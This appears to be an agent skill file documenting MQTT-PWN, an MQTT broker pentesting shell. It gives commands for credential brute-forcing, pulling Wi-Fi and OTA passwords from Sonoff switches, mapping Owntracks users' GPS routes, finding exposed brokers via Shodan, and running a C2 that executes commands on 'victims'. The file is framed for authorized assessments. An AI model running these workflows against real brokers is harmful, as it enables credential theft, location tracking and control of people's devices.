---
name: mqtt-pwn
description: "MQTT-PWN: interactive `cmd2`-based shell for IoT MQTT broker pentesting — connect, topic/message discovery, credential brute-force, broker fingerprinting ($SYS), Sonoff/Owntracks exploitation, and a publish/subscribe C2. Use when assessing exposed MQTT brokers (1883/8883), enumerating IoT topics, recovering broker credentials, or chaining MQTT to smart-home/ICS/IoT-device abuse in authorized engagements."
compatibility: "Linux, macOS, Windows (via Docker recommended); Python 3.x + PostgreSQL backend"
metadata:
  author: AeonDave
  version: "1.0"
---

# MQTT-PWN

One-stop interactive framework for MQTT broker penetration testing. Wraps enumeration, brute-force, fingerprinting, and publish/subscribe abuse modules in a single shell with SQLite-like persistence (PostgreSQL) so scans, topics, messages, victims, and credentials survive across the session.

## When to use mqtt-pwn

Use it instead of raw `mosquitto_pub`/`mosquitto_sub` when you need to:

- enumerate **topics and messages** on a broker over time and store them for later review.
- **brute-force** broker credentials with wordlists or inline lists.
- pull broker **metadata/fingerprint** from `$SYS/#` topics.
- target **Sonoff** smart switches or **Owntracks** GPS clients exposed on a public broker.
- run a publish/subscribe **C2** for lab/IoT-implant scenarios.
- chain MQTT findings into IoT, smart-home, or ICS workflows (pair with `ics-ctf` and `mosquitto-clients`).

Skip it for: single one-shot pub/sub checks (use `mosquitto-clients`), MQTT 5 enterprise features, or MQTT-SN — coverage is MQTT 3.1.1 over TCP/TLS only.

## Install

### Docker (recommended)

```bash
git clone https://github.com/akamai-threat-research/mqtt-pwn
cd mqtt-pwn
docker-compose up --build --detach     # builds db + cli containers
docker-compose run cli                  # drops into the >> shell
```

Stop/clean:

```bash
docker-compose down
```

### Host install (Python venv)

```bash
git clone https://github.com/akamai-threat-research/mqtt-pwn
cd mqtt-pwn
pyenv virtualenv 3.x mqtt_pwn_env       # or python -m venv .venv
pip install -r requirements.txt
# Configure PostgreSQL DSN in environment / config, then:
python run.py
```

The first run auto-creates DB tables. Drop `connect -o <host> -p <port>` lines into `./resources/shell_startup.rc` to auto-run on launch (`#` for comments).

## Shell at a glance

Prompt evolves as state is added:

```
>>                            (no broker)
host:1883 >>                  (after connect)
host:1883 [Scan #1] >>        (after scans -i 1)
host:1883 [Victim #1] >>      (after victims -i 1)
back                          (pop selection)
```

All commands support `--help`; many scans are async — the prompt stays usable while work happens in background.

## Quick reference

| Goal                          | Command                                                       |
|-------------------------------|---------------------------------------------------------------|
| Connect to broker             | `connect -o <host> -p 1883 [-t 60]`                           |
| Disconnect                    | `disconnect`                                                  |
| Broker fingerprint            | `system_info`                                                 |
| Discover topics+messages      | `discovery -t 30 -p '#' '$SYS/#' -q 0`                         |
| List async scans              | `scans`                                                       |
| Select a scan                 | `scans -i <id>`                                               |
| List topics in selected scan  | `topics [-s] [-l N] [-r REGEX] [-c]`                          |
| List messages                 | `messages [-s] [-l N] [-mr MSG_RE] [-tr TOPIC_RE] [-c]`        |
| Single message (JSON)         | `messages -i <id> -j`                                         |
| Brute-force credentials       | `bruteforce [-u U... | -uf file] [-p P... | -pf file]`        |
| Sonoff info grab              | `sonoff -p sonoff/ -t 10`                                     |
| Owntracks user/device list    | `owntracks`                                                   |
| Owntracks route               | `owntracks -u <user> -d <device>`                             |
| C2 — list infected            | `victims`                                                     |
| C2 — select victim            | `victims -i <id>`                                             |
| C2 — execute command          | `exec <cmd>`                                                  |
| C2 — review outputs           | `commands`                                                    |

Default wordlists live under `./resources/wordlists/usernames.txt` and `passwords.txt`.

## High-value workflows

### 1. First-touch broker triage

```text
>> connect -o 10.0.0.50 -p 1883
10.0.0.50:1883 >> system_info               # broker version, client counts, uptime
10.0.0.50:1883 >> discovery -t 30 -q 0      # async, listens to '#' and '$SYS/#'
10.0.0.50:1883 >> scans                     # wait until Is Done = True
10.0.0.50:1883 >> scans -i 1
10.0.0.50:1883 [Scan #1] >> topics -s       # only labeled (known device fingerprints)
10.0.0.50:1883 [Scan #1] >> topics -r 'cmd|set|write|config' -c
```

`-s` filters to topics matched against the bundled `resources/definitions.json` fingerprint list — fastest path to known device families (Sonoff, Owntracks, Tasmota, etc.).

### 2. Credential recovery on auth-required broker

```text
>> connect -o broker.local -p 1883
broker.local:1883 >> bruteforce                                  # uses default wordlists
broker.local:1883 >> bruteforce -u admin root -pf rockyou.txt    # mixed inline/file
```

Output prints `[+] Found valid credentials: user:pass` per hit; `Ctrl-C` stops. Reconnect with the recovered pair via `connect` + paho options is not in the shell — finish auth tests with `mosquitto_pub`/`sub` (see `mosquitto-clients`).

### 3. Sonoff smart-switch enumeration

```text
[Scan #1] >> topics -r '^sonoff'
[Scan #1] >> sonoff -p sonoff/<device_id>/ -t 10
```

Listens for `FullTopic`, `Hostname`, `IPAddress1`, `MqttHost`, `MqttUser`, `MqttPassword`, `SSId/SSId2`, `Password/Password2`, `WebPassword`, `otaU`, etc. Direct path from MQTT exposure to Wi-Fi credentials and OTA pivot.

### 4. Owntracks GPS exposure

```text
[Scan #1] >> owntracks                              # enumerate user/device pairs
[Scan #1] >> owntracks -u alice -d iPhone15         # → Google Maps URL of route
```

Useful both for IoT-broker risk demos and OSINT pivots on accidentally public brokers.

### 5. Publish/subscribe C2 (lab use)

```text
broker:1883 >> victims                              # check-ins from infected hosts
broker:1883 >> victims -i 1
broker:1883 [Victim #1] >> exec whoami
broker:1883 [Victim #1] >> commands                 # async results table
```

Operator subscribes to `output/<uuid>`, victims subscribe to `input/<uuid>`. Implant template lives at `mqtt_pwn_victim/victim.py` and is meant to be bundled via PyInstaller/Py2EXE for lab demos.

## OPSEC and broker-side effects

- `discovery` uses `#` and `$SYS/#` — extremely noisy in broker logs; restrict topics on production brokers (`-p sensors/# devices/+/status`).
- Publishing to actuator/command topics can trigger **real physical actions** (relays, valves, ICS setpoints). Read-only by default: subscribe with `mosquitto_sub -v` before any `exec`/`sonoff` write.
- Retained messages on test topics linger after disconnect — clear with an empty payload + `-r` flag in `mosquitto_pub`.
- Brute-force generates one CONNECT per attempt; broker rate-limits/IDS will fire. Throttle by chunking wordlists.
- DB persists everything (incl. captured passwords). Treat the PostgreSQL volume as evidence — secure or wipe per engagement rules.

## Pair with

- [mosquitto-clients](../mosquitto-clients/SKILL.md) — verification, TLS handshake details, retained-message cleanup, raw publish/subscribe outside the shell.
- [ics-ctf](../../../offensive-ctf/ics-ctf/SKILL.md) — when MQTT topics drive PLC/HMI logic or sit on an OT bridge.
- `nmap -p1883,8883 --script mqtt-subscribe` — initial broker discovery before connecting.
- `shodan search 'port:1883 mqtt'` — find externally-exposed brokers (authorized scope only).

## Troubleshooting

- **`connect` hangs**: increase `-t` (default 60s); broker may require TLS on 8883 — mqtt-pwn shell is plaintext-only, use `mosquitto_sub --cafile` for TLS brokers, then reuse credentials inside mqtt-pwn over the plain channel if exposed.
- **`scans` shows `Is Done = False` forever**: discovery thread crashed (often broker disconnect); reconnect and rerun, check container logs `docker-compose logs cli`.
- **Bruteforce 0 hits but auth exists**: broker may require `clientid` ACL or per-topic ACL rather than CONNECT-level auth; switch to topic-level probe with `mosquitto_pub -d`.
- **Empty `topics`**: low QoS + slow publishers; raise `-t` to 300, set `-q 2`, or target specific prefixes.

## Caveats

- Project pace is slow (Akamai/CyberArk research origin, 2018–) — pin the Docker image and treat as a stable research tool, not actively maintained pentest framework.
- MQTT 5 properties, MQTT-SN, and WebSocket transports are unsupported.
- PostgreSQL dependency makes ephemeral use heavier than `mosquitto_sub` — prefer Docker compose for short engagements.

## Resources

No bundled `scripts/`, `references/`, or `assets/`. Authoritative docs:

- Repo: <https://github.com/akamai-threat-research/mqtt-pwn>
- Docs: <https://mqtt-pwn.readthedocs.io/en/latest/>
- Plugin pages: `connect`, `grabber`, `topic_enum`, `brute`, `sonoff`, `owntracks`, `c2` under `/plugins/`.
